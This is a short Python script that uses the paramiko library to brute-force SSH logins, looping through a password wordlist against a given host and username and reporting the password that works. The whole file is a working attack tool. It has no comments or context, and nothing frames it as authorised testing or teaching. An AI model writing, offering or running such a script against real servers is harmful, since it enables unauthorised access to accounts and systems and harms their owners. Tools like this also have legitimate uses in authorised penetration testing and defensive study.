import paramiko

def ssh_brute_force(host, username, wordlist_path):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    with open(wordlist_path, "r") as file:
        passwords = file.read().splitlines()
    
    for password in passwords:
        try:
            client.connect(hostname=host, username=username, password=password, timeout=2)
            print(f"[+] Success! Password found: {password}")
            return password
        except paramiko.AuthenticationException:
            print(f"[-] Failed password: {password}")
        except Exception as e:
            print(f"[!] Connection error: {e}")
    return None
